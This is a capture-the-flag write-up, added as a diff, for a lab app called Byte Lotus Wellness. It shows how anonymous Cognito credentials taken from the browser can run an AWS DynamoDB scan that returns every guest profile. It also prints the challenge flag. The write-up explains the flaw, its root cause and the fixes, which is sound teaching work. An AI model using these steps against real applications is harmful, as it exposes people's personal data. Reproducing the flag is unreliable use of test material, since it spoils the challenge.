@@ -1,0 +1,275 @@
+# Byte Lotus Wellness — Hacker Holidays THM Writeup
+
+## Overview
+
+The Byte Lotus Wellness application provides a "guest dashboard" that requires no login. Instead of using traditional authentication, the application automatically assigns visitors temporary AWS credentials through an Amazon Cognito Identity Pool.
+
+The application uses these credentials directly from the browser to access an Amazon DynamoDB table containing guest wellness profiles.
+
+The security issue is that the unauthenticated Cognito role has excessive DynamoDB permissions, allowing any visitor to enumerate the entire guest database.
+
+---
+
+# Reconnaissance
+
+The website JavaScript revealed the following configuration:
+
+```javascript
+const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
+const AWS_REGION = "us-east-1";
+const TABLE_NAME = "complimentary-GuestWellnessProfiles";
+```
+
+The application initializes AWS credentials using Cognito:
+
+```javascript
+AWS.config.credentials = new AWS.CognitoIdentityCredentials({
+  IdentityPoolId: IDENTITY_POOL_ID,
+});
+```
+
+This indicated that anonymous users were being issued temporary AWS credentials.
+
+The application then directly queried DynamoDB:
+
+```javascript
+dynamodb.getItem(
+{
+  TableName: TABLE_NAME,
+  Key: {
+    guest_id: {
+      S: guestId()
+    }
+  }
+}
+)
+```
+
+The guest identifier was stored client-side:
+
+```javascript
+localStorage.getItem("byteLotusGuestId")
+```
+
+Example:
+
+```
+guest-4pasao8w
+```
+
+This showed that the browser was directly interacting with AWS services.
+
+---
+
+# Obtaining Temporary AWS Credentials
+
+Using the browser developer console:
+
+```javascript
+AWS.config.credentials
+```
+
+revealed temporary Cognito credentials:
+
+```
+AccessKeyId: ASIA...
+IdentityId:
+us-east-1:4d571309-b00e-cfb7-952b-503468c87b00
+```
+
+The credentials belonged to the IAM role:
+
+```
+complimentary-cognito-unauth-role
+```
+
+This confirmed that unauthenticated visitors were receiving AWS permissions.
+
+---
+
+# Validating AWS Identity
+
+The temporary credentials were configured locally and verified:
+
+```bash
+aws sts get-caller-identity
+```
+
+Output:
+
+```json
+{
+    "UserId": "AROAU2VYTBGYCEB4JME2S:CognitoIdentityCredentials",
+    "Account": "332173347248",
+    "Arn": "arn:aws:sts::332173347248:assumed-role/complimentary-cognito-unauth-role/CognitoIdentityCredentials"
+}
+```
+
+The session was confirmed to be an unauthenticated Cognito identity.
+
+---
+
+# Testing DynamoDB Permissions
+
+First, the application behavior was replicated by querying the current guest ID:
+
+```bash
+aws dynamodb get-item \
+--table-name complimentary-GuestWellnessProfiles \
+--key '{"guest_id":{"S":"guest-4pasao8w"}}' \
+--region us-east-1
+```
+
+The result was empty because the generated guest ID did not have a profile.
+
+Next, broader DynamoDB permissions were tested.
+
+Attempting to describe the table:
+
+```bash
+aws dynamodb describe-table \
+--table-name complimentary-GuestWellnessProfiles \
+--region us-east-1
+```
+
+returned:
+
+```
+AccessDeniedException
+```
+
+This showed the role was restricted.
+
+---
+
+# Exploiting Excessive Permissions
+
+The important test was whether the role could scan the entire table:
+
+```bash
+aws dynamodb scan \
+--table-name complimentary-GuestWellnessProfiles \
+--region us-east-1
+```
+
+The command succeeded and returned all guest records.
+
+Example results included:
+
+```
+guest-vibe
+guest-lambo
+guest-vip-042
+guest-patch
+guest-ponzi
+```
+
+The VIP profile contained the flag:
+
+```
+THM{fr33_app_fr33_d4t4!}
+```
+
+---
+
+# Vulnerability
+
+## Over-Permissive AWS Cognito Unauthenticated Role
+
+The application trusted anonymous Cognito users too much.
+
+The intended design was:
+
+```
+Anonymous visitor
+        |
+        |
+        v
+Only access own guest profile
+```
+
+However, the actual permissions allowed:
+
+```
+Anonymous visitor
+        |
+        |
+        v
+Scan entire DynamoDB table
+        |
+        |
+        v
+Access every guest profile
+```
+
+The IAM role assigned to unauthenticated users had excessive DynamoDB permissions, allowing full table enumeration.
+
+---
+
+# Impact
+
+An attacker could:
+
+* Obtain temporary AWS credentials without creating an account.
+* Assume the unauthenticated Cognito role.
+* Enumerate all guest wellness profiles.
+* Access sensitive information stored in DynamoDB.
+
+Exposed information included:
+
+* Names
+* Email addresses
+* Phone numbers
+* Locations
+* Notes
+* Password fields
+
+---
+
+# Root Cause
+
+The root cause was improper AWS IAM permission design.
+
+The unauthenticated Cognito role should not have had permission to perform:
+
+```
+dynamodb:Scan
+```
+
+on the entire table.
+
+Access should have been restricted to only the user's own record using IAM conditions tied to the Cognito identity.
+
+---
+
+# Remediation
+
+Recommended fixes:
+
+1. Remove unnecessary DynamoDB permissions from the unauthenticated role.
+
+2. Do not allow:
+
+```
+dynamodb:Scan
+```
+
+for anonymous users.
+
+3. Restrict DynamoDB access to only the user's own partition key.
+
+4. Avoid storing sensitive information such as passwords in DynamoDB records.
+
+5. Move authorization logic to a trusted backend service instead of relying on client-controlled identifiers.
+
+---
+
+# Conclusion
+
+The Byte Lotus Wellness application suffered from an overly permissive AWS Cognito unauthenticated role. Although users did not require accounts, they were still granted AWS credentials capable of scanning the entire DynamoDB guest database.
+
+By abusing the excessive DynamoDB permissions, an attacker could retrieve all guest profiles and obtain the challenge flag:
+
+```
+THM{fr33_app_fr33_d4t4!}
+```
